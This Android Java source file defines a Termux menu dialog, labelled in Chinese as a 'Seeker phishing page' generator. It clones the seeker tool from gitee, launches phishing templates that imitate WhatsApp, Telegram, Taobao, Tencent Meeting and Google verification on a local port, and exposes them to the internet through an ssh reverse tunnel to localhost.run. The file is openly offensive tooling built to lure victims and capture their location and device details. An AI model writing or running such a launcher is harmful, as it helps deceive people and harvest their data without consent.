package com.termux.menu.ui.dialog;

import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import com.termux.menu.termux.TermuxCommandHelper;

/** Seeker 钓鱼页面生成器 — 对齐 ZeroTermux-main SeekerDialog */
public class SeekerDialog extends Dialog {
    private Context mContext;
    private TermuxCommandHelper mCmdHelper;
    private Spinner mTemplateSpinner;
    private EditText mPortEdit;

    private static final String[][] TEMPLATES = {
        {"NearYou", "1"}, {"Taobao分享", "2"}, {"WhatsApp邀请", "3"},
        {"WhatsApp重定向", "4"}, {"Telegram邀请", "5"}, {"腾讯会议", "6"},
        {"Google验证", "7"}, {"自定义链接预览", "8"},
    };

    public SeekerDialog(Context context) {
        super(context);
        mContext = context;
        mCmdHelper = TermuxCommandHelper.getInstance(context);
        init();
    }

    private void init() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setCancelable(true);
        ScrollView scroll = new ScrollView(mContext);
        LinearLayout root = new LinearLayout(mContext);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF161823);
        root.setPadding(dp(20), dp(16), dp(20), dp(16));

        addTitle(root, "Seeker 钓鱼页面");

        root.addView(label("模板选择:"));
        String[] names = new String[TEMPLATES.length];
        for (int i = 0; i < TEMPLATES.length; i++) names[i] = TEMPLATES[i][0];
        mTemplateSpinner = spinner(names);
        root.addView(mTemplateSpinner);

        root.addView(label("本地端口:"));
        mPortEdit = editText("8080");
        root.addView(mPortEdit);

        TextView note = new TextView(mContext);
        note.setText("首次使用会自动从gitee克隆seeker工具(约50MB)");
        note.setTextColor(0xFF888888); note.setTextSize(11);
        note.setPadding(0, dp(8), 0, dp(8));
        root.addView(note);

        // 操作按钮
        LinearLayout btnRow = new LinearLayout(mContext); btnRow.setPadding(0,dp(12),0,0);
        Button startBtn = btn("启动", 0xFF4CAF50);
        startBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { startSeeker(); }});
        btnRow.addView(startBtn);

        Button stopBtn = btn("停止", 0xFFF44336);
        stopBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            mCmdHelper.sendCommandToTerminal("pkill -f seeker; pkill -f 'python.*seeker'");
            Toast.makeText(mContext, "已停止Seeker", Toast.LENGTH_SHORT).show();
        }});
        btnRow.addView(stopBtn);

        Button tunnelBtn = btn("隧道启动", 0xFF2196F3);
        tunnelBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            String port = mPortEdit.getText().toString().trim();
            if (port.isEmpty()) port = "8080";
            mCmdHelper.sendCommandToTerminal("ssh -R 80:localhost:" + port + " nokey@localhost.run");
            Toast.makeText(mContext, "隧道已启动: localhost.run", Toast.LENGTH_SHORT).show();
            dismiss();
        }});
        btnRow.addView(tunnelBtn);

        root.addView(btnRow);
        scroll.addView(root);
        setContentView(scroll);
        setupWindow();
    }

    private void startSeeker() {
        int idx = mTemplateSpinner.getSelectedItemPosition();
        String port = mPortEdit.getText().toString().trim();
        if (port.isEmpty()) port = "8080";

        String cmd = "if [ ! -d /usr/share/seeker ]; then " +
            "cd /usr/share && git clone https://gitee.com/skilfulwriter/seeker.git 2>/dev/null; fi; " +
            "cd /usr/share/seeker && python seeker.py -t " + TEMPLATES[idx][1] + " -p " + port;

        mCmdHelper.sendCommandToTerminal(cmd);
        Toast.makeText(mContext, "Seeker已启动: 端口" + port, Toast.LENGTH_SHORT).show();
        dismiss();
    }

    private void addTitle(LinearLayout r, String t) { TextView tv=new TextView(mContext); tv.setText(t); tv.setTextColor(0xFFFFFFFF); tv.setTextSize(18); tv.setPadding(0,0,0,dp(12)); r.addView(tv); }
    private void setupWindow() { Window w=getWindow(); if(w!=null){w.setGravity(Gravity.BOTTOM); w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT,(int)(mContext.getResources().getDisplayMetrics().heightPixels*0.75)); w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT)); if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O)w.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);else w.setType(WindowManager.LayoutParams.TYPE_PHONE);}}
    private TextView label(String t){TextView tv=new TextView(mContext);tv.setText(t);tv.setTextColor(0xFFBBBBBB);tv.setTextSize(13);tv.setPadding(0,dp(10),0,dp(4));return tv;}
    private EditText editText(String d){EditText et=new EditText(mContext);et.setText(d);et.setTextColor(0xFFFFFFFF);et.setHintTextColor(0xFF888888);et.setBackgroundColor(0x22FFFFFF);et.setPadding(dp(12),dp(8),dp(12),dp(8));et.setSingleLine(true);et.setTextSize(14);return et;}
    private Spinner spinner(String[] items){Spinner s=new Spinner(mContext); ArrayAdapter<String> a=new ArrayAdapter<>(mContext,android.R.layout.simple_spinner_item,items); a.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); s.setAdapter(a); return s;}
    private Button btn(String t,int c){Button b=new Button(mContext);b.setText(t);b.setTextColor(0xFFFFFFFF);b.setBackgroundColor(c);LinearLayout.LayoutParams p=new LinearLayout.LayoutParams(0,ViewGroup.LayoutParams.WRAP_CONTENT,1);p.rightMargin=dp(6);b.setLayoutParams(p);return b;}
    private int dp(int v){return (int)(v*mContext.getResources().getDisplayMetrics().density+0.5f);}
}
